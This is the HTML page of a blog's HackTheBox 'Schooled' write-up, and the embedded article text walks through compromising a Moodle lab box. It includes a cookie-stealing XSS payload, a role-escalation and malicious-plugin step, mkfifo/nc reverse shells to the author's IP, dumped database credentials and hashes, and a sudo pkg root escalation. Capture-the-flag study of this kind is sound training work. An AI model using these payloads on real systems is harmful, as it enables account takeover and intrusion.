<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox - Schooled | Ef's log</title>
<meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting">
<meta name=description content="Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system.">
<meta name=author content="Fahmi FJ">
<link rel=canonical href=https://fahmifj.github.io/writeups/hackthebox/htb-schooled/>
<meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8">
<link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.e6fcef2ff5441a87ba7de1a0f6d3317c591f50c7b9bdde49e999273839af13c4.css integrity="sha256-5vzvL/VEGoe6feGg9tMxfFkfUMe5vd5J6ZknODmvE8Q=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.1213dd5c1417a6f375b942671a496e7f1658eb9f78d0463ce610015753d08128.js integrity="sha256-EhPdXBQXpvN1uUJnGklufxZY65940EY85hABV1PQgSg=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDN0GP97D1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="HackTheBox - Schooled">
<meta property="og:description" content="Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://fahmifj.github.io/writeups/hackthebox/htb-schooled/">
<meta property="og:image" content="https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967.png"><meta property="article:section" content="writeups">
<meta property="article:published_time" content="2021-09-16T18:22:05+07:00">
<meta property="article:modified_time" content="2021-09-16T18:22:05+07:00">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967.png">
<meta name=twitter:title content="HackTheBox - Schooled">
<meta name=twitter:description content="Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://fahmifj.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://fahmifj.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Schooled","item":"https://fahmifj.github.io/writeups/hackthebox/htb-schooled/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Schooled","name":"HackTheBox - Schooled","description":"Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system.","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials, allowing me to recover a password from the database. The password is reused by one of the users for SSH login. The user is allowed to install FreeBSD packages with sudo permissions, and this can be exploited to gain root access.\nSkills Learned  Stealing cookie with XSS Moodle exploitation Sudo exploitation on pkg  Tools  Nmap Burp Suite  Reconnaissance Nmap A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that nmap identifies it as mysqlx.\n→ root@kali «schooled» «10.10.14.49» $ nmap -p- --max-rate 1000 -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-17 14:34 EDT Nmap scan report for 10.10.10.234 Host is up, received reset ttl 63 (0.045s latency). Not shown: 65532 closed ports Reason: 65532 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) 33060/tcp open mysqlx? syn-ack ttl 63 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.80%I=7%D=5/17%Time=60A2BA63%P=x86_64-pc-linux-gnu%r(N ...[SNIP]... Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 801.40 seconds Enumeration TCP 80 - schooled.htb Port 80 serving a homepage of a school institution.\n In the About section, it states that this school has an online learning system using Moodle, which the most popular LMS.\n The Teachers section displays the teachers of the school. This can be useful for generating username list.\n On the Contact section, there is an input form. The form submit button points to /contact.php, but it’s 404.\n At the bottom of the site, it reveals an email address and a domain name: schooled.htb.\n I will update my /etc/hosts with that domain name.\n→ root@kali «schooled» «10.10.14.49» $ echo '10.10.10.237 schooled.htb'  /etc/hosts/ Poking back the site with curl using its domain name reveals that it’s the same site.\n→ root@kali «schooled» «10.10.14.49» $ curl -s http://10.10.10.234/ | wc -c 20750 → root@kali «schooled» «10.10.14.49» $ curl -s http://schooled.htb/ | wc -c 20750 Subdomain Fuzz Enumerating subdomain using gobuster reveals that there is one called moodle.schooled.htb.\n→ root@kali «schooled» «10.10.14.49» $ gobuster vhost -u 'http://schooled.htb/' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://schooled.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/05/17 17:11:00 Starting gobuster in VHOST enumeration mode =============================================================== Found: moodle.schooled.htb (Status: 200) [Size: 84] Update /etc/hosts:\n→ root@kali «schooled» «10.10.14.49» $ echo '10.10.10.237 schooled.htb moodle.schooled.htb' moodle.schooled.htb\n→ root@kali «schooled» «10.10.14.49» $ curl -s http://moodle.schooled.htb/ | wc -c \u0026\u0026 curl -s http://schooled.htb | wc -c 84 20750 TCP 80 - moodle.schooled.htb Heading to moodle.schooled.htb shows that it’s Moodle LMS. There are four courses available here.\n It allows guest login, but nothing much I can do with that, so I will just register an account.\n Account Register It seems to register an account, I have to use the domain student.schooled.htb. I will change my email domain and login afterwards.\n After adding student.schooled.htb domain to my /etc/hosts, I visited the domain, but it’s just the same site as schooled.htb.\nEnroll course Based on the login activity only one of four teachers that seems to be active, that teacher is Manuel Phillips. So I will enroll to his course (it allows self-enroll).\n On the Mathematics course, there are two announcements .\n The first one titled “Reminder for joining students” by Manuel Phillips contains the following:\n After searching the MoodleNet on Google, I can found it under Dashboard - Preferences - User account - Edit profile .\n And the other one by Jamie Borham, which seems to be a reminder.\n Finding Vulnerabilities Exploit-DB At that time, I didn’t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword Moodle and sorted the results by latest, here are some potential public exploits I found:\n Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS) = CVE-2019-3810, PrivEsc student to administrator vs. box release 2021. Moodle 3.10.3 - ‘url’ Persistent Cross Site Scripting = Need a teacher or an administrator or a manager role. Moodle 3.10.3 - ‘label’ Persistent Cross Site Scripting = Worth to try.   Moodle Security The other place to look for the Moodle vulnerabilities/security issues is on https://moodle.org/security/.\nSearching page by page, I find one stored XSS that seems interesting because it contains “moodlenetprofile” in its title.\n Another one that looks promising is the privilege escalation from the teacher role and manager role.\n Testing XSS Moodle 3.10.3 - ‘label’ Persistent Cross Site Scripting I tried Moodle 3.10.3 - 'label' Persistent Cross Site Scripting using the following payload.\n It worked.\n Unfortunately, it’s an XHR.. didn’t know how to get the link, and probably teacher won’t look into calendar.\nBased on this XSS, it seems the currently hosted Moodle version is Foothold Access as Manuel Phillips Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile From the previous enumeration, I remember that Phillips mentioned ‘MoodleNet profile’ twice. Therefore, I’m guessing that the stored XSS (CVE-2020-25627) affected the MoodleNet profile fits this. With XSS I can attempt to steal Phillip’s cookie session.\nI will have my Netcat listening on port 80, then I will edit my MoodleNet profile (Dashboard  Preferences  User account  Edit profile  MoodleNet profile) and change its value to the following payload:\nscript iamf = new Image(); iamf.src='http://10.10.14.49/?iamf='+document.cookie;script Or this one:\nscriptdocument.write('+ document.cookie + '\" /')script  After a few minutes, there is a request coming to my listener:\n→ root@kali «exploits» «10.10.14.49» $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.49] from (UNKNOWN) [10.10.10.234] 26076 GET /?iamf=MoodleSession=40mch0eki9ko6kpe03kq36cd97 HTTP/1.1 Host: 10.10.14.49 User-Agent: Mozilla/5.0 (X11; FreeBSD amd64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept: image/webp,*/* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=33 I will update my MoodleSession to the one I obtained from XSS.\n When I refresh the page, I’m now logged in as Manuel Phillips.\n By visiting http://moodle.schooled.htb/moodle/user/view.php?id=24\u0026course=5, I can confirm that this Moodle version is 3.9.\n Shell as www-data Moodle CVE-2020-14321 - Teacher role - Manager role With Phillips’s account, I can confirm that I have the teacher role now, and since the version is known, I can attempt to exploit the privilege escalation (CVE-2020-14321) that affected this Moodle version.\nThe researcher who found this vulnerability made a public exploit for this on Github: https://github.com/HoangKien1020/CVE-2020-14321. He also created step by step video on https://vimeo.com/441698193.\nUsing the video as reference, the first step is enroll one of the teacher to my course.\n I will enroll Jamie Borham to my course and submit on Enrol users button.\n I will intercept the request using Burp Suite and change the userslist parameter to 24 (UserID of Phillips) then the roletoassign parameter to 1.\n On the course participant, I can see Phillips now has the manager role assigned.\n With manager role, I have the ability to impersonate my participant using “Login as” function. For example, if I want to login as Jane Higgins, it has to be on my course (mathematics) as participant first.\n Malicious Plugin When impersonating Lianne Carter, I see another menu called “Site Administration”.\n According to the exploit author of CVE-2020-14321, with manager role, I can obtain code execution on the underlying system by installing a malicious plugin. This can be done only if the manager role has full permissions (from my understanding this is possible because Lianne Carter has administrative access and manager role).\nThat said, I have to edit the manager role permission under Site Administration - Users - Define roles - Manager - Edit.\n Then I will just click on Save changes button and intercept its request.\n Except the sesskey parameter, I will change all the parameters with this PoC.\n Now I can install a malicious plugin by accessing Site Administration - Plugins - Install plugins\n I will grab the malicious plugin from this repository: https://github.com/HoangKien1020/Moodle_RCE.\n I will just continue on the installation process.\n Once the plugin is installed, it can be access on.\nhttp://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command] And I have RCE now\n Reverse Shell Since it’s FreeBSD, I will send the mkfifo payload .\nmkfifo /tmp/lol;nc 10.10.14.49 53 0\u00261 | tee /tmp/lol On my listener:\n I will upgrade my shell.\n$ /usr/local/bin/python3 -c \"import pty;pty.spawn('/bin/sh')\" $ export TERM=xterm export TERM=xterm $ which stty which stty /bin/stty $ ^Z [1] + 4974 suspended nc -nvlp 53 → root@kali «exploits» «10.10.14.49» $ stty raw -echo; fg [1] + 4974 continued nc -nvlp 53 $ ls -l total 0 $ ls -la total 0 $ pwd /usr/local/www/apache24/data/moodle/blocks/rce/lang/en Privilege Escalation Shell as jamie Enumeration There are two users other than root who have login shell.\n$ cat /etc/passwd | grep sh$ root:*:0:0:Charlie \u0026:/root:/bin/csh jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh steve:*:1002:1002:User \u0026:/home/steve:/bin/csh $ ls -l /home/ total 17 drwx------ 2 jamie jamie 11 Feb 28 18:13 jamie drwx------ 5 steve steve 14 Mar 17 14:05 steve The directory of the web is discovered under /usr/local/www/apache24/data\n$ ls -l total 18 -rw-r--r-- 1 www www 84 Dec 19 15:41 index.html drwxr-xr-x 56 www www 95 Feb 27 14:33 moodle drwxr-xr-x 6 www www 11 Feb 27 17:18 schooled.htb $ pwd /usr/local/www/apache24/data The config file contains database credentials.\n$ cat config.php ($CFG); global $CFG; $CFG = new stdClass(); $CFG-dbtype = 'mysqli'; $CFG-dblibrary = 'native'; $CFG-dbhost = 'localhost'; $CFG-dbname = 'moodle'; $CFG-dbuser = 'moodle'; $CFG-dbpass = 'PlaybookMaster2020'; $CFG-prefix = 'mdl_'; $CFG-dboptions = array ( 'dbpersist' = 0, 'dbport' = 3306, 'dbsocket' = '', 'dbcollation' = 'utf8_unicode_ci', ); $CFG-wwwroot = 'http://moodle.schooled.htb/moodle'; $CFG-dataroot = '/usr/local/www/apache24/moodledata'; $CFG-admin = 'admin'; $CFG-directorypermissions = 0777; require_once(__DIR__ . '/lib/setup.php'); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! MySQL MySQL binary cannot be resolved, but it’s available at /usr/local/bin.\n$ /usr/local/bin/mysql moodle -u moodle -pPlaybookMaster2020 mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 7517 Server version: 8.0.23 Source distribution Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. moodle@localhost [moodle] Table mdl_users holds all the Moodle user credentials.\nmoodle@localhost [moodle] select username,password from mdl_user; +-------------------+--------------------------------------------------------------+ | username | password | +-------------------+--------------------------------------------------------------+ | guest | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 | | admin | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW | ...[SNIP]... | iamf | $2y$10$GTtFW8Rpm8jnLJ1YmpTBy.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy | +-------------------+--------------------------------------------------------------+ 33 rows in set (0.00 sec) moodle@localhost [moodle] There are a lot of hashes to recover, so I will focus on the admin first.\nCrack hash Hashcat recovers the admin password to !QAZ2wsx.\n$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW Time.Started.....: Thu May 20 05:04:20 2021 (1 min, 25 secs) Time.Estimated...: Thu May 20 05:05:45 2021 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 166 H/s (2.93ms) @ Accel:4 Loops:2 Thr:11 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 13992/14344386 (0.10%) Rejected.........: 0/13992 (0.00%) Restore.Point....: 13728/14344386 (0.10%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024 Candidates.#1....: david23 - 110487 Hardware.Mon.#1..: Temp: 90c Util: 88% Core:1708MHz Mem:3504MHz Bus:16 Started: Thu May 20 05:04:18 2021 Stopped: Thu May 20 05:05:46 2021 Password Spray I spray the password on SSH, and it reveals that it’s password for user jamie.\n→ root@kali «schooled» «10.10.14.49» $ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success SSH 10.10.10.234 22 10.10.10.234 [*] SSH-2.0-OpenSSH_7.9 FreeBSD-20200214 SSH 10.10.10.234 22 10.10.10.234 [-] root:PlaybookMaster2020 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.234 22 10.10.10.234 [-] root:!QAZ2wsx Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.234 22 10.10.10.234 [-] jamie:PlaybookMaster2020 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.234 22 10.10.10.234 [+] jamie:!QAZ2wsx SSH 10.10.10.234 22 10.10.10.234 [-] steve:PlaybookMaster2020 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.234 22 10.10.10.234 [-] steve:!QAZ2wsx Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH Now I can login as jamie via SSH.\n→ root@kali «schooled» «10.10.14.49» $ ssh jamie@10.10.10.234 The authenticity of host '10.10.10.234 (10.10.10.234)' can't be established. ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.234' (ECDSA) to the list of known hosts. Password for jamie@Schooled: Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5 FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021 ...... jamie@Schooled:~ $ id uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel) Shell as root Enumeration User jamie is allowed to run sudo on pkg binary.\njamie@Schooled:~ $ sudo -l User jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install * According to GTFObins, this can be abused to install malicious FreeBSD package, but fpm  has to be installed first.\nMalicious package With fpm installed, I can create a malicious package that contains a reverse shell using reference from GTFOBins.\n→ root@kali «exploits» «10.10.14.49» $ TF=$(mktemp -d); echo 'mkfifo /tmp/lol;nc 10.10.14.49 53 0\u00261 | tee /tmp/lol'  $TF/x.sh;fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use #finish to prevent that. /var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in `initialize' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `block in output' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `output' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute' /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in `run' /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run' /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in `run' /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `' /usr/local/bin/fpm:23:in `load' /usr/local/bin/fpm:23:in `' Created package {:path=\"x-1.0.txz\"} I will transfer the package to Schooled.\n→ root@kali «exploits» «10.10.14.49» $ $(bash -c 'cat x-1.0.txz  /dev/tcp/10.10.10.234/9000') On Schooled:\njamie@Schooled:~ $ nc -lv 9000  x-1.0.txz Connection from 10.10.14.49 60744 received! jamie@Schooled:~ $ I will setup a Netcat listener and start to install the malicious package.\njamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz pkg: Repository FreeBSD has a wrong packagesite, need to re-create database pkg: Repository FreeBSD cannot be opened. 'pkg update' required Checking integrity... done (0 conflicting) The following 1 package(s) will be affected (of 0 checked): New packages to be INSTALLED: x: 1.0 Number of packages to be installed: 1 [1/1] Installing x-1.0... On my listener:\n→ root@kali «exploits» «10.10.14.49» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.49] from (UNKNOWN) [10.10.10.234] 23093 # whoami \u0026\u0026 id \u0026\u0026 hostname \u0026\u0026 cut -c-15 /root/root.txt root uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) Schooled 2462d8e2125d2a0  Reference(s)  https://github.com/HoangKien1020/CVE-2020-25627 https://github.com/HoangKien1020/CVE-2020-14321 https://gtfobins.github.io/gtfobins/pkg/  ","wordCount":"2468","inLanguage":"en","image":"https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967.png","datePublished":"2021-09-16T18:22:05+07:00","dateModified":"2021-09-16T18:22:05+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/writeups/hackthebox/htb-schooled/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class="header sticky">
<nav class=nav>
<div class=menu-wrapper>
<div class=logo>
<a href=https://fahmifj.github.io/ accesskey=h title=友人F>友人F</a>
</span>
</div>
<ul id=menu onscroll=menu_on_scroll()>
<li>
<a href=https://fahmifj.github.io/about/ title=About>About</a>
</li>
<li>
<a href=https://fahmifj.github.io/archives/ title=Archives>Archives</a>
</li>
<li>
<a href=https://fahmifj.github.io/projects/ title=Projects>Projects</a>
</li>
<li>
<a href=https://fahmifj.github.io/search/ title="Search (Alt + /)" accesskey=/>Search</a>
</li>
</ul>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox - Schooled
</h1>
<div class=post-meta>
September 16, 2021&nbsp;·&nbsp;12 min&nbsp;·&nbsp;Fahmi FJ
</div>
</header>
<div class=post-content-wrapper><div class=toc>
<div class=inner><ul>
<li>
<a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul>
<li>
<a href=#nmap aria-label=Nmap>Nmap</a></li></ul>
</li>
<li>
<a href=#enumeration aria-label=Enumeration>Enumeration</a><ul>
<li>
<a href=#tcp-80---schooledhtb aria-label="TCP 80 - schooled.htb">TCP 80 - schooled.htb</a></li>
<li>
<a href=#subdomain-fuzz aria-label="Subdomain Fuzz">Subdomain Fuzz</a></li>
<li>
<a href=#tcp-80---moodleschooledhtb aria-label="TCP 80 - moodle.schooled.htb">TCP 80 - moodle.schooled.htb</a></li>
<li>
<a href=#finding-vulnerabilities aria-label="Finding Vulnerabilities">Finding Vulnerabilities</a></li>
<li>
<a href=#testing-xss aria-label="Testing XSS">Testing XSS</a></li></ul>
</li>
<li>
<a href=#foothold aria-label=Foothold>Foothold</a><ul>
<li>
<a href=#access-as-manuel-phillips aria-label="Access as Manuel Phillips">Access as Manuel Phillips</a></li>
<li>
<a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul>
</li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul>
<li>
<a href=#shell-as-jamie aria-label="Shell as jamie">Shell as jamie</a></li>
<li>
<a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul>
</li>
<li>
<a href=#references aria-label=Reference(s)>Reference(s)</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content>
<figure class=entry-cover>
<img loading=lazy srcset="https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967_hu1917814efbb7b9f10b0162a3a2480b9c_144290_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967_hu1917814efbb7b9f10b0162a3a2480b9c_144290_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967_hu1917814efbb7b9f10b0162a3a2480b9c_144290_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967.png 740w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/writeups/hackthebox/htb-schooled/imgs/image-20210916163736967.png alt="HackTheBox - Schooled" width=740 height=473>
<p>HackTheBox - Schooled</p>
</figure><p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to two vulnerabilities: a stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, and then install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials, allowing me to recover a password from the database. The password is reused by one of the users for SSH login. The user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and this can be exploited to gain root access.</p>
<h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4>
<ul>
<li>Stealing cookie with XSS</li>
<li>Moodle exploitation</li>
<li>Sudo exploitation on <code>pkg</code></li>
</ul>
<h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2>
<h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3>
<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ nmap -p- --max-rate <span class=m>1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-17 14:34 EDT
Nmap scan report <span class=k>for</span> 10.10.10.234
Host is up, received reset ttl <span class=m>63</span> <span class=o>(</span>0.045s latency<span class=o>)</span>.
Not shown: <span class=m>65532</span> closed ports
Reason: <span class=m>65532</span> resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 7.9 <span class=o>(</span>FreeBSD 20200214<span class=p>;</span> protocol 2.0<span class=o>)</span>
80/tcp    open  http    syn-ack ttl <span class=m>63</span> Apache httpd 2.4.46 <span class=o>((</span>FreeBSD<span class=o>)</span> PHP/7.4.15<span class=o>)</span>
33060/tcp open  mysqlx? syn-ack ttl <span class=m>63</span>
<span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>5/17%Time<span class=o>=</span>60A2BA63%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>N
...<span class=o>[</span>SNIP<span class=o>]</span>...
Service Info: OS: FreeBSD<span class=p>;</span> CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
